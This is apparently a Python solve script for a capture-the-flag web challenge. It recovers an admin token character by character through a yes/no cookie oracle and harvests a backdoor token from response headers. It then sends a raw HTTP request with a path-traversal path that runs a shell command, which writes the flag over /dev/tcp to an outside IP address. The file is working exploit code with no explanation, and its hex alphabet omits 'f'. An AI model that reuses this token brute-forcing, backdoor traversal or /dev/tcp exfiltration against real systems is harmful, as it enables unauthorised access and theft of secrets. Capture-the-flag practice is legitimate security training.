import requests
import urllib

URL_TEMP = "http://edu-ctf.zoolab.org:1337{path}"
# URL_TEMP = "http://localhost:1337{path}"
HEX_CHARS = "0123456789abcde"

def get_tokens():
    found = False
    r = None
    cookies = {}
    URL = URL_TEMP.format(path="/give_me_flag")
    print(f"[+] Trying to find the first character of admin_token at {URL}")
    for ch in HEX_CHARS:
        guess = ch
        cookies = {"admin_token": guess}
        try:
            r = requests.get(URL, cookies=cookies, timeout=5, allow_redirects=False)
        except requests.RequestException as e:
            print(f"[!] Request failed for {guess}: {e}")
            continue
        body = r.text.strip()
        print(f"Trying {guess} -> {body}")
        if body == "yes":
            found = True
            break

    if not found:
        print("[-] No valid character found, stopping.")
        return None, None 
    
    print(f"[+] Found first character: {guess}")
    while True:
        set_cookie = r.headers.get("Set-Cookie")
        new_cookie = set_cookie.split("admin_token=")[1].split(";")[0]
        cookies = {"admin_token": new_cookie} 
        try:
            r = requests.get(URL, cookies=cookies, timeout=5, allow_redirects=False)
        except requests.RequestException as e:
            print(f"[!] Request failed for {new_cookie}: {e}")
            continue
        body = r.text.strip()
        print(f"[+] Admin token: {new_cookie}")
        if body != "yes":
            print(f"[+] Backdoor token: {body}")
            return new_cookie, body 

def retrieve_flag(admin_token, backdoor_token):
    import socket # python requests is a pain in the a$$

    HOST = "edu-ctf.zoolab.org"
    PORT = 1337
    PATH = "/backdoor/../(^_^)/|>#"
    BODY = "{\"cmd\": \"echo $FLAG > /dev/tcp/140.112.247.246/1234\"}"
    req = (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"X-Backdoor-Token: {backdoor_token}\r\n"
        f"Cookie: admin_token={admin_token}\r\n"
        f"Content-Length: {len(BODY)}\r\n"
        f"Content-Type: application/json\r\n"
        f"\r\n"
        f"{BODY}"
    )

    with socket.create_connection((HOST, PORT)) as s:
        s.sendall(req.encode())
        resp = s.recv(4096)
        print(resp.decode())

if __name__ == "__main__":
    admin_token, backdoor_token = get_tokens()
    retrieve_flag(admin_token, backdoor_token)


